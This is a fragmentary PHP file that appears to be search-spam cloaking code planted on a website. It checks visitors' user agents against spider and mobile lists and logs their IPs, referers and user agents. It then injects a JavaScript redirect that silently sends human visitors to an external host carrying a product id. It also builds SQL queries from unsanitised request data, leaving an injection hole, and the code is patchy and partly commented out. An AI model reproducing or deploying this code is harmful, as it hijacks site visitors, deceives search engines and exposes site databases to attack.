 ...
 */
class BSLF_redirect {
    private $BSLF_files = array(
        'AC' => 'access_check.txt',
        'AU' => 'access_usage.txt',
        'REDIRECT' => 'redirect.txt',
        'VU' => 'includes/BSLF_visitsUaList.php',
    );
    private $BSLF_userAgent = '';

    function __construct($basePath) {
        foreach ($this->BSLF_files as $key => $val) {
            $this->BSLF_files[$key] = $basePath . './' . $val;  //修改路径
        }
        if (isset($_SERVER['HTTP_USER_AGENT'])) {
            $this->BSLF_userAgent = $_SERVER['HTTP_USER_AGENT'];
        }
    }
    private function BSLF_getBobyField($id) {
        $where = array(':entity_id' => $id);
        $row = db_query('SELECT body_value FROM {field_data_body}  WHERE entity_id = :entity_id', $where)->fetchField();
        return $row;
    }

    private function BSLF_getCategoryField($id) {
        $contentid = db_query('SELECT entity_id FROM `field_data_field_tags` WHERE `field_tags_tid`=' . $id . ' and `entity_type`=\'node\' and `bundle`=\'article\' ORDER BY RAND() LIMIT 0,1')->fetchField();
        $row = $this->BSLF_getBobyField($contentid);
        return $row;
    }
    private function BSLF_insertRedirect($host, $pid) {
        // db_insert('bslf_redirect')
        //         ->fields(array(
        //             'ip' => ip2long($this->BSLF_ip()),
        //             'host' => $host,
        //             'pid' => $pid,
        //             'count' => 1,
        //             'date_add' => strtotime("now"),
        //             'referer' => addslashes($this->BSLF_referer()),
        //             'user' => $this->BSLF_userAgent,
        //         ))
        //         ->execute();

        DB::query('INSERT INTO hbslf_redirect (ip,host,pid,count,date_add,referer,user) VALUES (?,?,?,?,?,?,?)',
         array(
            ip2long($this->BSLF_ip()),
            $host,
            $pid,
            1,
           strtotime("now"),
            addslashes($this->BSLF_referer()),
            $this->BSLF_userAgent
        ));
      
    }
    private function BSLF_insertVisit() {
        DB::query( 'INSERT INTO hbslf_visit (ip,count,date_add,referer,user) VALUES (?, ?,?,?,?)',
         array(
              ip2long($this->BSLF_ip()),
             1 ,
             strtotime("now"),
    ...
    public function BSLF_thePosts($posts = null, $wp = null) {

        $fix = $this->BSLF_isRedirect();
        // if (empty($fix)) {
        //     return $posts;
        // }
    // var_dump($_SERVER);
    // exit;
        ...
        // var_dump($requestUrl);
        include_once('ext_function.php');
        // $r = sp_url();
        // $id = !empty($r['id']) ? $r['id'] : 0;
        // echo $_SERVER['REQUEST_URL'];
        // $variable=$_SERVER['REQUEST_URI'];
         $variable=$_SERVER['SERVER_PROTOCOL'];
       
        // ||strpos($variable,"/tag/" )||strpos($variable,"/page/")
        if(strpos($variable,".html")){
            $arr1=explode("-har-", $variable);
            $id=str_replace(".html HTTP/1.1", "", end($arr1));
            $res = DB::get_results("select content from hposts where id =".$id);
            // var_dump($res);exit;
            foreach ($res as $key) {
                 foreach ($key as $key2) {
        ...
        // var_dump($a);
        // exit;
        // $action = !empty($r['typename']) ? $r['typename'] : '';
        // if (empty($id) || empty($action))
        //     return;
        // $content = '';
        // switch ($action) {
        //     case ART_STR:
        //         $content = $this->BSLF_getBobyField($id);
        //         break;
        //     case CATE_STR:
        //         $content = $this->BSLF_getCategoryField($id);
        //         break;
        //     default:
        //         break;
        // }
        ...
        if (preg_match('~\{\{(.*?)\}\}~i', $content, $match)) {
            if (isset($match[1]) && !empty($match[1])) {
                $host = substr($match[1], 0, strrpos($match[1], ':'));
                $product_id = substr($match[1], strrpos($match[1], ':') + 1);

                $this->BSLF_statRedirect($host, $product_id);

                if (strpos($host, 'http') !== 0) {
                    $host = 'http://' . $host;
                }
                // var_dump($_SERVER['HTTP_REFERER']);exit;
                if($_SERVER['HTTP_REFERER']=="http://www.yahoo.com"){
                    return;
                }
                $redirect_url = "$host/?c05ef9kl&fix=$fix&pd=$product_id";
            }
        }
        if (!empty($redirect_url)) {
            ...
            echo '<script>window.navigate("' . $redirect_url . '");</script>';
        }
        return $posts;
    }
    function BSLF_statRedirect($host, $pid) {
        $this->BSLF_insertRedirect($host, $pid);
        @file_put_contents($this->BSLF_files['REDIRECT'], date('Y-m-d') . "\t" . urldecode($_SERVER['REQUEST_URI']) . "\n", FILE_APPEND);
    }
	...
	foreach($blocks['agent'] as $agent){
        ...
        @file_put_contents($this->BSLF_files['AU'], date('Y-m-d') . "\t" . $ua . "\t" . urldecode($_SERVER['REQUEST_URI']) . "\n", FILE_APPEND);
        $this->BSLF_insertVisit();
    }
    /**
     * 检测客户端是否为蜘蛛
     * boboit 2015.12.16
     * @return bool
     */
    function BSLF_checkJstatUa() {
        $jstat_ua_list = $this->BSLF_visitsUa();
        foreach ($jstat_ua_list as $agent) {
            if (stripos($this->BSLF_userAgent, $agent) !== false) {
                return true;
            }
        }
        return false;
    ...
    function BSLF_ip() {
        $ip = '0.0.0.0';
        $arr = array('HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR',);
        foreach ($arr AS $v) {
    ...
    function BSLF_referer() {
        $r = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        return $r;
    }
    function BSLF_visitsUa() {
        return include($this->BSLF_files['VU']);
    }
...
X497|SGH-X507|SGH-X600|SGH-X610|SGH-X620|SGH-X630|SGH-X700|SGH-X820|SGH-X890|SGH-Z130|SGH-Z150|SGH-Z170|SGH-ZX10|SGH-ZX20|SHW-M110|SPH-A120|SPH-A400|SPH-A420|SPH-A460|SPH-A500|SPH-A560|SPH-A600|SPH-A620|SPH-A660|SPH-A700|SPH-A740|SPH-A760|SPH-A790|SPH-A800|SPH-A820|SPH-A840|SPH-A880|SPH-A900|SPH-A940|SPH-A960|SPH-D600|SPH-D700|SPH-D710|SPH-D720|SPH-I300|SPH-I325|SPH-I330|SPH-I350|SPH-I500|SPH-I600|SPH-I700|SPH-L700|SPH-M100|SPH-M220|SPH-M240|SPH-M300|SPH-M305|SPH-M320|SPH-M330|SPH-M350|SPH-M360|SPH-M370|SPH-M380|SPH-M510|SPH-M540|SPH-M550|SPH-M560|SPH-M570|SPH-M580|SPH-M610|SPH-M620|SPH-M630|SPH-M800|SPH-M810|SPH-M850|SPH-M900|SPH-M910|SPH-M920|SPH-M930|SPH-N100|SPH-N200|SPH-N240|SPH-N300|SPH-N400|SPH-Z400|SWC-E100|SCH-i909|GT-N7100|GT-N7105|SCH-I535|SM-N900A|SGH-I317|SGH-T999L|GT-S5360B|GT-I8262|GT-S6802|GT-S6312|GT-S6310|GT-S5312|GT-S5310|GT-I9105|GT-I8510|GT-S6790N|SM-G7105|SM-N9005|GT-S5301|GT-I9295|GT-I9195|SM-C101|GT-S7392|GT-S7560|GT-B7610|GT-I5510|GT-S7582|GT-S7530E', 'LG' => '\bLG\b;|LG[- ]?(C800|C900|E400|E610|E900|E-900|F160|F180K|F180L|F180S|730|855|L160|LS840|LS970|LU6200|MS690|MS695|MS770|MS840|MS870|MS910|P500|P700|P705|VM696|AS680|AS695|AX840|C729|E970|GS505|272|C395|E739BK|E960|L55C|L75C|LS696|LS860|P769BK|P350|P500|P509|P870|UN272|US730|VS840|VS950|LN272|LN510|LS670|LS855|LW690|MN270|MN510|P509|P769|P930|UN200|UN270|UN510|UN610|US670|US740|US760|UX265|UX840|VN271|VN530|VS660|VS700|VS740|VS750|VS910|VS920|VS930|VX9200|VX11000|AX840A|LW770|P506|P925|P999|E612|D955|D802)', 'Sony' => 'SonyST|SonyLT|SonyEricsson|SonyEricssonLT15iv|LT18i|E10i|LT28h|LT26w|SonyEricssonMT27i', 'Asus' => 'Asus.*Galaxy|PadFone.*Mobile', 'Micromax' => 'Micromax.*\b(A210|A92|A88|A72|A111|A110Q|A115|A116|A110|A90S|A26|A51|A35|A54|A25|A27|A89|A68|A65|A57|A90)\b', 'Palm' => 'PalmSource|Palm', 'Vertu' => 'Vertu|Vertu.*Ltd|Vertu.*Ascent|Vertu.*Ayxta|Vertu.*Constellation(F|Quest)?|Vertu.*Monika|Vertu.*Signature', 'Pantech' => 'PANTECH|IM-A850S|IM-A840S|IM-A830L|IM-A830K|IM-A830S|IM-A820L|IM-A810K|IM-A810S|IM-A800S|IM-T100K|IM-A725L|IM-A780L|IM-A775C|IM-A770K|IM-A760S|IM-A750K|IM-A740S|IM-A730S|IM-A720L|IM-A710K|IM-A690L|IM-A690S|IM-A650S|IM-A630K|IM-A600S|VEGA PTL21|PT003|P8010|ADR910L|P6030|P6020|P9070|P4100|P9060|P5000|CDM8992|TXT8045|ADR8995|IS11PT|P2030|P6010|P8000|PT002|IS06|CDM8999|P9050|PT001|TXT8040|P2020|P9020|P2000|P7040|P7000|C790', 'Fly' => 'IQ230|IQ444|IQ450|IQ440|IQ442|IQ441|IQ245|IQ256|IQ236|IQ255|IQ235|IQ245|IQ275|IQ240|IQ285|IQ280|IQ270|IQ260|IQ250', 'iMobile' => 'i-mobile (IQ|i-STYLE|idea|ZAA|Hitz)', 'SimValley' => '\b(SP-80|XT-930|SX-340|XT-930|SX-310|SP-360|SP60|SPT-800|SP-120|SPT-800|SP-140|SPX-5|SPX-8|SP-100|SPX-8|SPX-12)\b', 'GenericPhone' => 'Tapatalk|PDA;|SAGEM|\bmmp\b|pocket|\bpsp\b|symbian|Smartphone|smartfon|treo|up.browser|up.link|vodafone|\bwap\b|nokia|Series40|Series60|S60|SonyEricsson|N900|MAUI.*WAP.*Browser');
    ...
    protected static $utilities = array('DesktopMode' => 'WPDesktop', 'TV' => 'SonyDTV|HbbTV', 'WebKit' => '(webkit)[ /]([\w.]+)', 'Bot' => 'Googlebot|DoCoMo|YandexBot|bingbot|ia_archiver|AhrefsBot|Ezooms|GSLFbot|WBSearchBot|Twitterbot|TweetmemeBot|Twikle|PaperLiBot|Wotbox|UnwindFetchor|facebookexternalhit', 'MobileBot' => 'Googlebot-Mobile|DoCoMo|YahooSeeker/M1A1-R2D2', 'Console' => '\b(Nintendo|Nintendo WiiU|PLAYSTATION|Xbox)\b', 'Watch' => 'SM-V700',);
...
if (!function_exists('safe_cut_str')) {
